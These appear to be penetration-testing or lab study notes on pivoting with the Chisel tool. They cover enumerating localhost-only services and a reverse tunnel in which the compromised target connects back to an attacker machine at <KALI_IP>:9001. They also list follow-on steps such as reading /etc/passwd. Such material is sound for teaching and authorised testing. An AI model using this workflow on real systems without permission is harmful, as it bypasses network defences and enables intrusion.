# 🛡️ Linux Privilege Escalation: Port Forwarding & Tunneling (Chisel)

---

## 1. Core Concept: Port Forwarding vs Tunneling

These two terms are closely related but not identical.

---

## Port Forwarding

Port forwarding is a technique used to:

- Expose an internal service to another network
- Redirect traffic from one port to another

### Example:
An internal service running on:

```text
127.0.0.1:6666
```

is not accessible externally, so we forward it to an external port.

---

## Tunneling

Tunneling adds a security layer:

- Encapsulates traffic inside another protocol
- Often encrypted
- Prevents inspection of traffic

---

## Relationship

| Concept | Purpose |
|--------|--------|
| Port Forwarding | Access hidden services |
| Tunneling | Secure the forwarded traffic |

---

# 2. Why Chisel is Used

Chisel is a lightweight tunneling tool that allows:

- Reverse port forwarding
- Cross-network access
- Firewall bypass in controlled environments
- Encrypted communication channel

---

# 3. Step-by-Step Exploitation Workflow

---

## Step A: Enumeration (Finding Hidden Services)

After initial access to a target machine, check active ports:

```bash
netstat -plant
```

---

## What to Look For

Focus on entries like:

```text
127.0.0.1:6666
```

---

## Meaning

- `127.0.0.1` → Only accessible locally
- External scans (Nmap) will NOT detect it
- Service is hidden inside the machine

---

# Step B: Service Verification

Check what is running internally:

```bash
curl http://127.0.0.1:6666
```

---

## Possible Output

- HTML page → hidden web application
- API response → internal service
- Error → restricted endpoint

---

## Security Insight

This confirms:

- Internal service exists
- External access is blocked
- Requires port forwarding or tunneling

---

# 4. Chisel-Based Exploitation

---

## Architecture

We build a reverse tunnel:

- Kali → acts as server
- Target → connects back as client
- Traffic is redirected through tunnel

---

# Step C: Setup Chisel Server (Kali)

```bash
./chisel server --reverse --port 9001
```

---

## Server Role

- Listens for incoming connections
- Accepts reverse tunnel from target
- Forwards traffic to local ports

---

# Step D: Setup Chisel Client (Target)

```bash
chmod +x chisel
```

---

## Connect back to Kali

```bash
./chisel client <KALI_IP>:9001 R:3333:127.0.0.1:6666
```

---

## Command Breakdown

### R:3333:127.0.0.1:6666

| Part | Meaning |
|------|--------|
| R | Reverse tunnel |
| 3333 | Local Kali port |
| 127.0.0.1:6666 | Target internal service |

---

## Flow Explanation

1. Target connects to Kali server
2. Tunnel is established
3. Kali opens port 3333
4. Requests to 3333 → forwarded to target’s 6666

---

# Step E: Access Hidden Service

Now open in Kali browser:

```text
http://127.0.0.1:3333
```

---

## Result

- Internal target service becomes accessible externally
- Hidden web applications are exposed
- Further exploitation becomes possible

---

# 5. Post-Exploitation Opportunities

Once access is achieved, attacker can:

- Identify LFI vulnerabilities
- Exploit command injection
- Extract sensitive files:
  - `/etc/passwd`
  - `/root/root.txt`
- Pivot deeper into internal network

---

# 🛠️ Troubleshooting Section

---

## Error 1: Permission Denied (Chisel Execution)

### Problem

```text
Permission denied: ./chisel
```

---

### Cause

- File not executable after download

---

### Fix

```bash
chmod +x chisel
```

---

## Error 2: Connection Refused (Reverse Tunnel Fails)

### Problem

Target cannot connect to Kali server.

---

### Causes

### 1. Firewall blocking port

```bash
sudo ufw allow 9001
```

---

### 2. Wrong IP address used

- Using wrong interface IP (eth0 instead of VPN tun0)
- Always verify:

```bash
ifconfig
```

---

## Error 3: Browser Not Loading Service

### Problem

```text
http://127.0.0.1:3333 not working
```

---

### Causes

### 1. Tunnel not established properly
- Check server logs

### 2. Wrong protocol
- Service may be HTTPS instead of HTTP

---

### Fix

Try:

```text
https://127.0.0.1:3333
```

---

### 3. Port mismatch
- Ensure correct mapping:
  - 3333 → target internal port

---

# 🧠 Key Takeaways

---

## Chisel Workflow

1. Identify internal services
2. Confirm localhost-only ports
3. Setup Chisel server on attacker machine
4. Connect Chisel client from target
5. Forward internal service externally
6. Access hidden service via localhost port

---

## Why This Works

- Internal services often bind to localhost only
- Firewall blocks direct access
- Tunneling bypasses network restrictions

---

# ⚡ Security Insight

Chisel exploitation works because:

- Developers bind services to localhost for safety
- Attackers abuse reverse tunnels
- Internal services are rarely hardened

---

# 🧠 Final Summary

Port forwarding and tunneling with Chisel allows attackers to expose hidden internal services that are not accessible externally, enabling deeper exploitation and privilege escalation paths.

---
